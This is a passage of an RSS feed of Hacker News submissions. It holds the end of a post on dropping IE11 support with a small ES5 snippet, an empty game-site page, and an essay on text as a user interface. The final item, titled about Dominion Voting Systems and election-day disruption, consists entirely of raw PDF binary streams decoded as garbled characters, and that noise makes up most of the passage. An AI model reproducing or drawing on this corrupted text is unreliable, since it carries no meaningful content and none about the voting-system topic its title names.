to be able to read my articles and to show up in my analytics. Everything else, I’m willing to cut or sacrifice in the name of freeing up the resources for creating a better no-JS experience. If that’s my minimum viable experience, I am going to create it and test that it actually works, and then <strong>stop iterating</strong>, so that I don’t accidentally break it with my future changes to the enhanced, modern browser experience.</p><p>It may seem like more work to craft a separate experience for ES5 users instead of just backporting your modern JS, but it’s really not. The whole point of modern frontend JavaScript is that everything is broken into small modules that are imported and bundled in development. So, <a href="https://github.com/spotlightpa/poor-richard/blob/ab0ad83/src/esbuild/nomodules.js">here is the whole of the entrypoint</a> for my ES5/IE11 build:</p><div><pre><code data-lang="javascript"><span>import</span> <span>"../utils/add-listeners.js"</span><span>;</span>

<span>// eslint-disable-next-line no-console
</span><span></span><span>console</span><span>.</span><span>warn</span><span>(</span><span>"could not load enhancements"</span><span>);</span>
<span>document</span><span>.</span><span>body</span><span>.</span><span>classList</span><span>.</span><span>add</span><span>(</span><span>"has-old-js"</span><span>);</span>
</code></pre></div><p>Once the import is loaded, Babel’d, and minifed, it comes to 17KB (real KB, not <a href="https://twitter.com/carlmjohnson/status/1069968685606031360">moon weight</a><i>!</i>). Essentially all the listeners do are add <a href="https://github.com/jehna/ga-lite">some analytics</a> and the JavaScript to make the menu hamburger button work. The <code>.has-old-js</code> class triggers a CSS utility class to show and hide things conditionally. A <code>&lt;noscript&gt;</code> tag in the HTML does the same, as does an <code>onerror</code> handler on the module script. This lets me show one experience to modern browsers and a secondary fallback experience to everyone else. Because this code is essentially set in stone, I …</p></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/">https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/</a></em></p>]]>
            </description>
            <link>https://blog.carlmjohnson.net/post/2020/time-to-kill-ie11/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077805</guid>
            <pubDate>Fri, 13 Nov 2020 01:35:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Game with 179 levels generated using neural networks]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25077797">thread link</a>) | @ent101
<br/>
November 12, 2020 | https://www.outpan.com/app/99694412f2/qubes | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/99694412f2/qubes">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/99694412f2-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>23</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/99694412f2/qubes">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/99694412f2/qubes</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077797</guid>
            <pubDate>Fri, 13 Nov 2020 01:34:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Text as a User Interface]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077768">thread link</a>) | @thesephist
<br/>
November 12, 2020 | https://thesephist.com/posts/text/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/text/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>There’s a resurgence in products using text as the primary user interface.</p>
<p>The most popular tool that uses text as a core UI is probably Microsoft Excel. Excel is a mostly-<a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> application, but when interacting with formulas and programming cells, the interface of choice for most users is text – typing in formulas as textual information, not clicking buttons. When we want to take the sum over a row, most of us click on the cell and type <code>=SUM(A3:A10)</code> – we don’t click on a “sum” button or unfurl a dropdown menu.</p>
<p>The poster child of textual user interfaces is the command line in the terminal. But I think a new crop of tools, combined with a more tech-savvy market, is staging the rebirth of text as a user interface. Textual interfaces are everywhere in the modern workplace. Slash-commands in Slack and Discord and Notion, hash-tags for channels and tagging, special syntax for searching and querying data across applications, @-mentions in social media and team work environments, and so on. We’re training ourselves to be more savvy users of the <em>textual interface</em>.</p>
<p>
<img src="https://thesephist.com/img/text-interface.jpg" alt="Text as an interface">
</p>
<h2 id="the-forces-at-work">The forces at work</h2>
<p>I think we’re seeing textual interfaces rise in popularity wherever people look for any of the following.</p>
<h3 id="progressive-feature-discovery">Progressive feature discovery</h3>
<p>Text interfaces within graphical UIs gained popularity in places with a high feature-to-visual-complexity budget. In other words, when there’s many more features than can fit comfortably on the screen at once, we hide that surplus complexity behind text options.</p>
<p>In many tools with a high degree of hidden complexity, the average user uses only a small subset of those features frequently. A Slack workspace, for example, might have a hundred slash-commands enabled, but each individual team member may only frequently use 5-10 of those commands on a regular basis. Rather than clutter up the interface with a hundred buttons or a web of dropdown menus, we hide the complexity behind text options, and the user can learn the few features they use most frequently, so they can access them again easily.</p>
<p>This idea applies to tools with a lot of complexity, where any single user might only take advantage of a small subset of that feature set. I think more tools are falling into this bucket as productivity tools consolidate. If a single kind of interface is shared by all business-chat clients, or all product-management tools, or version control software – rather than building custom interfaces for each workflow or use case, why not provide a wide surface area of functionality that’s accessible via text?</p>
<h3 id="extensibility-and-the-portable-interface">Extensibility and the portable interface</h3>
<p>Modern software workflows cross application and service boundaries all the time. Textual interfaces provide an enforceable, rigorous contract between services and applications that can act as the interfaces for apps to integrate with external services, in a way that visual interfaces can’t.</p>
<p>In a software development team, a proposal for a bug fix might flow through a task tracker, which connects with a team messaging app, where an engineer might run a group poll or lead a discussion. The request change might flow back into the task tracker, into a version control system like GitHub, and then deploy automatically to production servers.</p>
<p>Workflows like this require that apps from completely different vendors and domains are able to communicate with each other. More importantly, it requires that the interfaces we use to control these tools be <em>portable</em>. A portable interface carries the same kind of UI across different services, so the user can interact with any service similarly across all of its integrations. Portability means that we can enter data into our task tracker through our chat client, or request the rollout of a change through an infrastructure provider from our version control system.</p>
<p>These integration points are much easier to build, and easier to master as end users, when they all share the same, portable format – text.</p>
<h3 id="automation">Automation</h3>
<p>Textual interfaces make automation trivial, and automation tools much easier to build.</p>
<p>More people are using tools like <a href="https://zapier.com/">Zapier</a> and <a href="https://runalloy.com/">Alloy</a> to automate common business tasks or link very domain-specific workflows together across services. Having a shared portable interface across these apps, and a syntax format that can serve as a contract for how to use that interface, makes it possible for these automation points to communicate to dozens of other services easily. It also minimizes the possibility that a future update to the UI might break an automated workflow.</p>
<p>Text interfaces are much easier for machines to use. And as more work is done autonomously by the workflows we teach machines to perform, text interfaces are starting to matter just as much as human ones.</p>
<h3 id="sharability">Sharability</h3>
<p>People naturally want to document their workflows to remember, share, and iterate upon as a team. To share a graphical workflow, I’d need to record my screen or spend time writing down instructions for how to navigate a visual interface, clicking the right buttons and checking the right boxes. Reifying workflows as text makes this much easier – I can just encode a workflow into a few lines of text input.</p>
<p>In this way, workflows driven by text interfaces are easier to share, document, and iterate over time within a team. Text interfaces make workflows more concrete.</p>
<h2 id="workflows-not-data-are-the-subject-of-innovation">Workflows, not data, are the subject of innovation</h2>
<p>Given these benefits of text as an interface, weighted against the very real cost – text is a more esoteric way to use a computer – why are we seeing a resurgence in this trend now?</p>
<p>I think the easiest factor we can identify is that more people entering the workforce are unafraid of textual interfaces, because they’ve been typing and messaging and tagging their friends online all their life. They already interact with computers via text.</p>
<p>But the second reason that’s driving the industry to text is that <strong>the focus of software services has shifted from manipulating <em>data</em> to manipulating <em>workflows</em>.</strong> We’ve learned how to store and sift through data in our computers as a society, so we’re moving up a step of abstraction, to storing and sharing the how’s of our work, not just the what’s.</p>
<p>Workflows, not data, are the subject of product innovation now. And the subject is easier to study, to compare, to share and extend, when it’s concrete and durable, not an organic, ephemeral series of actions.</p>
<p>I think as long as we’re innovating on <em>how</em> we work, and how the services we use can work together more effectively, text as an interface is here to stay. And why not? The software industry has spent the last half-century building tools to help us wrangle with text, and we can rediscover those tools and ideas again.</p>
<p>We’re entering a renaissance of user interfaces, not in the sense of a novel paradigm shift, but in the sense of a rediscovery of classic, enduring ideas on which we can build better tools and systems. And I, for one, welcome it.</p>

        <hr>
        <p>
            If you enjoyed this piece, you might also enjoy
            
            my next post,
            <a href="https://thesephist.com/posts/language/"><em>In defense of natural language</em></a>.
            
        </p>
        <p>
            I share new posts like this on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this post, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#contact">email me.</a></p>
    </article></div>]]>
            </description>
            <link>https://thesephist.com/posts/text/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25077768</guid>
            <pubDate>Fri, 13 Nov 2020 01:29:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dominion Voting Systems – Disruption on Election Day (2019)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25077762">thread link</a>) | @halturing
<br/>
November 12, 2020 | https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019 | <a href="https://web.archive.org/web/*/https://www.thebluemountains.ca/document_viewer.cfm?event_doc=1019">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>Ä]&gt;Æê}wû(Xÿ'é€eHKŒ�â<sŒx‚zc)v:&È\´;{âdÉç)jq(f"¯”Èƒã³†ä1¤ˆÏyôç°òˆ8l9Ù&»�_ÿœããÂ²^žòÞåÑçeœôcnø£¤˜†w%nõiºd\Ÿ�ç;¬€o6:Ê]- êÏ="">}’�¢)Žž÷DÿB.|¬“;wAž½ž¼;ãä•âQaØ¢»+Ê^Ó(Ùä°Lèó¢ä{™Ã—ÐRlúB&amp;°P¬0n&lt;“wÀðj¢Ô°CÄIï:;&nbsp;tÝD;'zÞ#J6m†(ë‘qµ±ïêƒÂì�¿�†!QaÊïÑ†ýúŸ*NÚ5
endstream
endobj
275 0 obj
&lt;&gt;stream
hÞÄTM�Ó0ý+&gt;Â%¶ã¯dµªh�+-jŠz¨zÈ¦�¶ë¬WˆÏŒãxCa‚‡W{¦3ož=ÎpEáš¨œpCxÎ9á¬Z^.JE®¯iE?¯o¯ëîäû+ßµÍ©uoü±½?�ÛÇþl}ÝÙ!kê×‹ä¬ê¡½é­§K×Õ§�úÞ6ý¡³_è¶³K;tÉ¾éÜàßkGÅŒwíÐ¸îÉ÷Žp	òÖô®Ž¹R´:ßûoO-Ý¸s»	ü	¥¶ÝÁ‡�QŒüOä¦J¥t@Q”Dk¸â’!Äð©BŽ±`OySÎï�â�#üœqŠ!LžÚk í�ÈXð�  Ä‚?äÅ¸”÷¥”‰ý“„ÔeàÂÃ$¡Pc.8íQÿÇµ˜çDÆžó`obÎ!àõ¸â5ÖÃ5ðGÎfB’O‘LÁ#á:¥#R¿"õœ8£�""íÔÕŸº¦YÒ`”7QŠ�&gt;ß£DnY&gt;WG.qÂüàZÅÊ<ejÒ‚èÔÙæ�Ìc÷§q kæ1ów_ÆkÏ?…ù«¸|ÎôÀÅü²ÆÄËØ="">Œ¡¿]Kœ…8wVU`¨Æ³êÝ¡utKØb�ƒ8¶§è-]·�ßé23Š”Efr
'&amp;Ã±ÊE&amp;ŒÚÓÊ»sã?Õ®µžÈ4Éî:û0–XZÛûIƒú'
RðŒ•Å¤A*“©/4ˆ—5|`¤bÒ
endstream
endobj
276 0 obj
&lt;&gt;stream
hÞ,ŽM‚@†ÿÊë 3ëW
"h!uÈCJâa‘EÖÖ=ä¿¯¶N3ó&lt;ÃÌË&lt; `&gt;°ú°è[Ú$ÁlíÄd€‘OxäËYÈ~0p`!žÄO9ž`¡x¿‚çb1O&amp;ÏçWã„a`¸Dd´Ö|”jÛeZrµ·¤ä£@;_k*£…é,g=reÑã÷Ø'Â‹áJvÙÔ+„•ã¢ëmvõLËÅÌŸÿ¼‹Óô-ÀøDFï
endstream
endobj
277 0 obj
&lt;&gt;stream
hÞ¼X]oÛ6õOáãú0‹—ßŠq×b]Û$HÒ'Ïª«&amp;^]ÉPå­ùóÛÅ+ÇKÛX°±¯Iž{x¿x)ÅX!…q‚¤Æã/
DtJ˜(ˆ"	+iÒÂdÂ*AŽŒ°2Xa� o½°VP�XYpR`Š¢„^€4À�/† °¤¤–Â¤W[)ŸÓ�PrF(%I8	[œƒŒV8/”ÖÈ€õ(”QFxð,zðY’”ÊÂ8&gt;�ðàs:
&gt;0Ÿ×XŸOëà0ž«ûø¢R[¨ˆ ðEÄ!h¡¥6"H�ÀuM¼ƒ„SÁ­$ô$ü
“Q
­U&nbsp;ÐFF%´!+"ø‚Ág'¸¨m{H€"øœv!×FEðyøK„Q 	�@°«)Þ&nbsp;ÑÓ)›:š4Ö6’N©“²,CÒ
Â�J3È¹‚9OŸ¯æ¨).Y›%Â¹(.Ê¶ª»ë¶ªR�`joæ¬úÒ½ªîÀT\6ëêM¹IE”0×w›ª¸êÚí²^6MwrÒïƒýz~ÙSz‘w�Ùˆè³`Hd
É’X*–£aÉHöHf¶�ÕBÖ
Y)d��UBÖ¬�·yû˜w�™%f›lV°YÁf—\Vp¬�7rywÏÈÌâ³-.“¹Læ2Äg=Ÿ9}æôÌ™õ¼æ„	Óƒ‹«âªZæ°Ÿm?}žËt´ûˆ¤³�~¨t¸Ó�NwúÑïžtNv¨Ï2°dv�ØCb‰�#Çùpœv“ØAb‰]$vŽØ;b÷È3Ç‡¼}0f^ï÷Ç·CúÝZ˜Ç-‹%ïÆuA\Ä•A\ÄµA\ÄÕA\ÄõA\ ÄBC½s¡W:q©×:q±W»âjW\íÃ¸Þ®×ý×"k‹&gt;Å§uÝte·jêâjSÖÅiÛ­&gt;”Ë®¸(f«wëUsÓ–›Û»4x^wí]ñì¶l»âÅêfÛVÅO«ëŸvÃ¶Ù&lt;+7ÃðyýäUq–¾^à,ß�^ÖëU]]Ý–8ïŒ&gt;ßvi.›�°úX5ÛŽ‡ÛwŸ—íj³nªvâeÖ|IÖoë÷U»c:9ZÇÿ×2¸I-æÿAïXÌÿmó°ßj%»º|ìî'ò¬}s�t›oµ™^kèû-gh\ù´-ú.ð}þî7”óýup&gt;ûåòädQ¼.ë›žŸýøöê	šUv£¸¸š»ÖëUý‘/µã	yÌ#<l¶Šµò­·¯uÁ*~ˆóx!"Ö ¥Ñ¤j<©mjf#íh¤;Âûc"õÐ«Ü¹ÿ‘éyóþn€ûðü="" ó="¸’ãqDÎÔxèø¤©ñYSãÓ¦Üh¨¬S‘/Ü¤CßÄ" ×Ó�w\†ÏpcÌ="M}zóˆSß¿˜izÏ�Såp`Ïaç]ºt.Öå²ú„ÇÕb¶n–ïÕ]œZ‹kA99" éÕÃ¨)^="" mµ3^q7mÅ‡šzÉ}ƒŸ+v�Ïƒ3€="" Êæ{Ê�4z�="" :ˆÜ="" 5št�fšÑh;éÆ»äg“†ÑÈ8="">ör¼¥D£ia%3ðÒáüßƒÕá
Ø�GÔÀWXsÖ�uG`ý˜@èÃÕðq&lt;Kò+ˆŽ¡VGQ“&gt;Ÿ¿Óþ¿iætÝýðç_“å¤™¬ñÙNÚ‰˜ü&gt;© ?OV˜©1n&amp;ðÝMn1/&amp;×ÿ±7Íó30lû_oz¦%8j0‰ÉkÌÝàóký$Ùj¿c_~éØ»ÔT¢ÅÒTá!ï®S‹X7õR?ÖÕÿ`üg]Ç
endstream
endobj
278 0 obj
&lt;&gt;stream
hÞ„•?oAÅ¿ŠK¨v&lt;ÿlKÑT å”¤‹Ò€¢�
ßžçY]Nä\ygýæ7ž·g�A…xLbmˆB•ñ&lt;”êèˆFU…xjºÉÔt³RSèf£Î†Ø©�Š8¨ë@œ4X…Æz¯4–Þh:G
MçÓTè¤’Tè¤‘x-ÒIÌuƒ´ùz’1#
jdÁžÒ|¯
…º¢V,ªA£H·Vö‹5TÊŠt3¿*Jì+…E_)lè+ò¨&nbsp;ª¹-`xÃSÆ~a¬Ìoäg™[aØa~—†•
/°Å*Ø±Jixí:ßnT‹/,^:uuµ}zð�Qèv}Œ=jDÛ#&gt;Æ9b�Ø"öˆ#bðfðfðfð$x&lt;	žO‚'‹ó¸ñ­ýi»Ûîž¾þ&gt;¼l*xÏcOŸq§šcø-Á5o÷ïÞ‡ªf˜–	z&amp;™`fÉš	,u+÷“SEj&amp;§nrj'§~rj(gŽ&gt;ø4‘ý]Ëcª6„›/ß‘’sÕýŸ_OÛÍ‡�·‡Ãâì?ï×œÏß~þTÝÇÎ:¸¥×úr°¦Ï‹ûl[}§ÑŸý©ÑŸý©ÑŸý®Ñïý®Ñï&lt;žÏ‚gÁ³àYð,x&lt;žY|Ž’Î91Ãþ7.	j&amp;h™&nbsp;g‚ñ–àšOgÂ%„dÍ–:•{™šÉ©›œÚÉ=µ‹G
IåÔRÖ¼K%5³Õg€ÿGŸÌ€‹ê—À|®:›Ñ;¯9ûø+ÀWBR
endstream
endobj
279 0 obj
&lt;&gt;stream
hÞl�AoÂ0…ÿŠ�›ÄhâU£H©¢ëibhL»‡Ê°HmŒÃÆ¿_š"@'ûùù‹ü‚
Aªg@]Äš
f³¬|™Dë#[ðÁ	`V[$­öÓ7“DžÄÊxêwTRŸVZz¨Ëz¬§c¥s¨¸³Î²ƒ/ëv°&gt;¡.À‚ýž½‘ÞzZÒ.ºƒà-¼¶Ô¤~Mþh
PÁ–Û–ÒÃ*üa?PîJUæ4‚÷FxCGñ6]&lt;ÎççdÓtè’~ïdÀ›¥ˆi¾»ÞÐWº¸¬&lt;/¿ó�ÆHÿ	0™žkÍ
endstream
endobj
280 0 obj
&lt;&gt;stream
hÞÄ”ßNÂ0Æ_¥O`{úgl	Y¢(Ä#a»0!\ŒÙ�®d+	¾½§keh6À¼`§ëùÚ�ï—s�„ Br"ˆŠáL‘˜Æ„Œ€ŒÇtb*«+Û,b”/0‘øÈYˆ"Q„(CT.®è¤6›³[²+&lt;ˆ¿8&gt;G	&gt;WôA?¿ƒÙyQc
øéö“t¡³­KÝ´õ½›:Û¥v/m¸\·µ¤)½ÛÙYfëT³V%CfŠq3ÏÝfÔÍsw4kN@² ~z\¿éÒéï?œ&gt;ìcfaÜí„ÑÌÖÛÒúŠ|Ï‹uC3šn4úxÑiz@•„Z/Šæ�¦‡ÍA¿¹ëª2.+¼·o«ò¬þê‚ómãZˆNàG	pýDÀe|I\Á�†F�G^5kU}"“•b*=Šçµ)3m—t~;¥¹ÞYd1YÌ†‡›Üðpu²¿ÔqºAGÔEéBÜÑ•jˆ®]Ù÷§#yG7ˆ}#Ê®÷×ŸMÚ÷®'
£S¤ãÒ_í@£*
endstream
endobj
281 0 obj
&lt;&gt;stream
hÞ¤‘ÏjÃ0Æ_EO [JdYPíiƒFSØ!ä°u9”A:‚{ØÛOn…B/&gt;|þlýùYæ˜ Ç¤.
$L~”“«ïM`¨¶ç8×qµ
kà$Õ„Mï¶÷µûùžÂæ¸|NKxƒØuW3D�‹cx
Ïa;íË�U€X�˜½hÂœ
¨ÉHÂcèËrÚ—×÷ešhèO¥V~9Ì_—ëy&gt;–®»R¤?R°zc&nbsp;Ôb}icµÊ‚ÜÒFzŒ1ÔäÛTZý×TÔ0«
Çˆ¢
£�ÉŽ=Æù`çi
endstream
endobj
282 0 obj
&lt;&gt;stream
hÞìYYO1þ+~¯ÐúöZBH&nbsp;‚ŠSTT}XÈ¶¬
”l+ñï;ãµ�B
i+¨dE_s­ÇþÆ²™â„¦$aL•P„qÃ¡Â%t+J¸’Ð--áV*Â™ ’Qh1maHÉOI”¤ *
QŠ)¨(¢47P‘D
�ÏX´#9±Œ²¾^ªi=·]±9iª›â}{55í·â¼i7ÛiÛÃf2í¶®«	¡òo×Ó«Is×�'„s_r\ìWžƒ+Uœü¸ìîïêâtò£&gt;uüs–Î›Qw=ýlàû^“¸)	¥´£²´Dk˜3Ëˆ¢'èSÇí d~G‘tD‚~F!JhÉpîÈµ#°í)uýÎApÀñB¿“ó|QÎ×-ÝëÆþà’„…ƒºðc¢£`#u8ÖÑ Ç²Le&lt;9=”&gt;ÈAÝx™@BÀê¾Ä	ª·‡¥Óïõ0š8;ð+bEð“°âH1^^uÏuúNŒãðjCTEMÓèƒ`Þx¿Ðyß§`KÔ
4ZG]ø„™éZùÊHø1HsäœŽ‘M(�$÷Ñ+bžÐY“ò¤«Ì¯Œ§–-n…tUÌ/çgm˜˜…6‚^J¿ll¤(´³{~üñü�£ƒÓQ¦nGUÛáèñÐAM„¥½QÝvMw¿¶û€8ðG‹ÓñYÛS�häd"ÍZlí�{‹ìéì™eöÂ§­‚´Lf&nbsp;Í@›�6ííáÑ§ý�³w;ãîººŒÇßŸH‚?:ûI:IŒÙ�ôŽšÎ‚c)Aq`Ñ�Kåkö±€³²²6×â±Œ±¾,ñ�­Šƒ&amp;Ëüx©KüWž‹¢¥¯«Å^(ƒ€{Ê°¾´°\t“¹½(-à5Ó&nbsp;QûQI‘ð€J7¢J°/ÃÚ`|3Z5;û¿¦Ü¸ÒÈ™=áPY”-=DÐHÒîkÔâ};Ÿ@‡ƒþU³Cð;ú‘d‡°C‰ý¸’¬pÁ¥O?ÈÍO"çüMç�xxIã\Îd‡$«¬’‚‹!,Î^ß³³Cù‡Ù!	ü²ì0¿½�ì°ä°h~5¤²Ã£þ‡Õ6‡EÕÝ×m€›Ëª›«Ûz¶/gŽ¼ì©în}ó³îš«*‚8Ø£¾Ó„ãÏÓ”¯$òI9Ÿ”óIùuOÊÃ£ƒáÓW\¼üŠ€ËeW'›Ã“­O]Iúr{‚ýöJbm¯«nš«Ïžüÿ={fÀÍ€›÷
n¾!Í0”a(ÃÐ[€¡|—ïãò}\¾�{åû¸÷ZS.}­‘ìï¼Öh&amp;æÞkúWùÕ^lúÿ—¼ØP÷^CW}­�hü`ü­M
endstream
endobj
2 0 obj
&lt;&gt;stream
H‰„WÙnÛH}÷WÔË"`•YÜ5h4`Ç�e€&nbsp;3°Ðypú�E‹™(*Žÿ~ê.µ°$¥CæV·nÝåœsï–W7·ÃØµõj¿ývs;Žõj³nÄãÍr·ßÜÝí~ŠÇ"—‹"eRÈD"Ï3YU¢Ì¹P‰þêáø4¾í×âæãºnÖƒ¸YâÝ—ú¹ëë±Ûõâ÷ßïîß‰«›w±XD,ÄaÕ_Ý,—±PbÙ^Å2Žs±\‰9\éG¯B[žÇúKý¿ÔY&amp;±|¹zœ½‹*1ÛE‰˜½Dÿtð3ŽëH¥b¶Žô�ØE*‘JÌZ-äB¿ÝÐ[ñ5ÊÅl©˜­laí:ú{ùŸ«\ˆqwíÇ.›«™ˆ–ÿ»b¿|“DÆ}ó8{¿Žæz·§h®­
GüWã&amp;Ã[`;•E65�¤|Ÿ™­R»Õ–Ä2Wf§k&lt;^+´¾Œ'2û'¿çéBÌ•Lüêýí{yºkŠA�envU	q‹Uv²a9Ùpnwt�Ò	(�¡/š¹ý³æÄdÂò,?Ù 7äÁG�Óy…Y*ã‚­¤gŒþñÊó4ÁçwŸîõ+.Ù3•‰ñK8~�³%Ñ†ŠSrïŠ³‹”þí±&lt;ñi¯¿€ªÁÔ¨®L|Ý?Gº·fâK¹Æ…#Z}¡…âíGÚb&nbsp;GúÉsT@43~ÖðŽøX|ŠT	‹ðË�Þàz|0j'TÂŽ�“…Ö&gt;Zý•Üc+h&gt;ð�Ÿmíá^ÑvC§¢›^ÜÂë¶uÛ¢‰é™ÿŒÐMü†Ï‚Ù3•”–ÒÖO·ÃÒöÊ~b«úqöùØ;‡élûÚº«_ÁøÐèÖÞØÀC¸òŒ<vˆñä"céhà)þ\g*‡î„ë~Ãp7‚¬÷ ®drr:n‡k¦|="" ª½x7Ôÿ‚[ÿ&pûäeÐy×Ó1¸h¦ÙkîÙnýpÛÖfˆˆý˜ßckwØ�!pqéù¬õx­ý…ÂÆ·õ="" +ž¾¡×Ï4~(zg£lúádŸñáÞÓÂne‰íöôù¶ÃïØ8a4ºgëújëhaÐ¶ž[è9a;ÙlÞõéõ²}Ò¹w1Ç˜ct�~ôº8c`dàñ:ÐØ²k¼=",ÈšÝ%4ó‚}K®q\ÐÙ" ¬xÑ«cpÊ›@d��øŒ·^dôo="" k´åÛq&®!‘x¡Ì6èßÞó›lpÈñxô|û†="" Ó‚):ó="" üp´~|1´÷*²�eh™Œo¹¡˜rÂlx"="" €<–™å·{ê¯k]g�zsu¨mvvˆômg¨¥2×�“6¯Ñù){!¹+%so£Æˆ9$nèÓ[0ÑÎã¢b¦~ypg;Ä«cu‚8Ê»qcŒ„="‹$Ç)ƒã¯ñ" Ë="!" Œ aü¯<ÚbÄÅ¦3Ô_}'k»�¨+§¼zj\ªnr¼àª4äÿ†�="" lÌ\ab8”sÊ1Þuôï€zêk™æïx•�pryð%lg9òüxfs="" žâd}Ä²,oôÆz~l­æpfsÜ-a+'�›ô­e="" <iã¥È…Òâòìåœ6�°ëe,«ÅÄ‹_ï¢{ËŠn�åè&�«o:�pu�(ôc‘›.ÒÉ‰—z“j[dé_j;…vz�û™¾Ó…nÇj‰a}Õrx="" n‘%v‘�bß'Ãc^•2ohzx"�lpw®oe¢¼³¯Ä3yj¥&”Éw¨fË\zŸ‘È&f�ÊÂð€lãÑ§="" tºjå¡c(]bÍ•‹‘ý“gÆsgk,.æ‰[á="" i1)‹ˆ="" ä‚#v„ƒÁžØbÀrftû#ã�5?‹?18»wö@äkŠ²7Âwª˜‘6¬îuò(p%ès¸ì¼½¬¦àš(™ù�jj#æfÔnö¡7ude3£¡�“{"�ýq‹çÂ�yuÒé“�.¬Â‘zp©i¨èpiÔÓäñãìt@.Ýxa8¹cf¢5b0b­íi§Éµ°´äi›³¢ë‚ä¢:5%'½ƒ)’5®ûîdŠ)å"Ô*ïxÕùf="" 2"ù="" ùkm›b�="">XV£<q.¼Ñˆt0ü‰µ#®@n“ ‹�{nhs() ÎÀdú˜á·‚)dmªÃèw="" soxq,o…="" ¦•j‡q8Ç™q””="" ùoûpÑ¶®'’eƒz*s‹½Ó="" þk»ø4a“ºlé<´­­dkí7)é›jƒŠ×Œiü="" #—Ò¯õxa<l:«zœvãôŒf}¸^9åÜo^bý±hmæ"jÄÍ=""  +ÜÃî�-i¨gi3›ÝÌ‹xzøfëaéÆÍŒ<ï‰¿="" Œfàñ¬×®i‘+;Ôm)æy#Ë†Ä�£0"u²Êl¸_‘·[a&¥Îpg2•sjsyù©¥8µ^,|}É™x¼am¾Û¹="9ÏX³°Å¶3sÐ[„ÿÂq£’Y*QeÜQy¨D—$" !’Ém}¾ƒh.Í‰–lfm‡q?ð�4Çt‚ú<òt0Š×šè��æÁ~oßlÑyz£.mtýyc…i2½$¼`ûgú‡¨ñä5d¯`«vÐs®g¸$oí="">àôà†Ç›ÃT‘T`*tÇ$&lt;5Q"|×Â3�Œ&lt;+ÈêKþÀ}.¶X?€ov#:Õäáõ3ŸƒÏáø&gt;]Q­ŒsxýDÝc)†-I¯©}’ß«J|›�
o“k¨Ú¸À›BàÂ-îŒ—+â;ß
¢Óß"x~2àêþ:<qœzq|Žañ<±q"æòÁm�7Ž¤z‹a,j�†ú‘¢³$fÀgÓšqÐa—p€ËdæÄ¾yq¼q3�´~ayhÅcò“ÍhØ°ç½†@r€0³(cÂµÛ†kŸsàj£Á`û#›²úÌ8Äqe3‚_�Ïû,ab‚'Ìp‡§0®0 ( ”ô¦¶„ägÀh="" ›Â‰êôÁô¢ptºñ[’$qnmû7mÇ14´â½öÄ¤›¨j™å~Ÿ)t3]&i‚ Ý)©="">7_
žRrÊÈf,Y{OsÇÈÃF¡à&lt;™\”áy‚ásžj)ýX¿@ç¯ø}Fþíq]A€ßàç"Kf²´üö„Þw<p �…“ÈÌn§�kî­í="¬ækÜyÚÔ†~}Ù1Hà¢ýb1ÁS-†¯©CxžsñÄH·<Ïð­×ËÍ‘àÁŸ‘NdTë\0�ùô)�­Ô»6Ð‰¡JZ" Ùš°jŽÔ¤="" ™ÉÞ!¢b�ìm0="">^
Jc±$µÜQ¿ò\ƒû
î€DxQ—2·©¬7ñÔêT�°žg/²¦	R™¥4Sý Ñ‡xý«]zê�"
ôÕÂBÑjg¸›¾‚ë€°d\„	Ô�'süvß“Dª)N�'�lv
Rõ¥1+Å%yœ}´èñêê1@*ú)~£æ¤`œ)GU�SõÍŽ9ÝN½ƒž.šMœp²x®²*ü²³&gt;�,sÃ…‡nÔUàŠVÉn8o£�½È&gt;JZÊ##CÀiø
›¶IŸcêtûUöæÁÅ¯·&lt;�u:0}ÃjÞÐIkµ’ªŒÃGä¥ƒ3�(§0�¢÷ãïf%&lt;Îªxõ´uGo=Zž&lt;6±—êrô§è;§ yÙÜã	16ZàUánH&amp;sÕîæÓ–*
›:X×ôOÐÜ¤¶©§N:sq‘ˆ•!bÛë“³’Èaq7?á,¤q8µ½ÓPÝöb"ÍR\‰íäÔ&nbsp;h(‹o!Ó&amp;g˜6µ%$Á�†·
þ	ÿõŽ%’¤:ç§Éˆ›
^ãQP¼ÒX@`¹ÝRyéw‚‡È�@ÅŽ—°À˜h#Œ@—v=B§ôÏ"&gt;—E9å%«u[(+UH–$z�æeáŽÂÁªo€Á@¿cº¿ÿ�_J–P0sßÝê»J|€ßÁíqÏe!Øƒ–¤Åèùˆ×­N¹Œ&gt;w“fÖØ¡|IlP– °o;
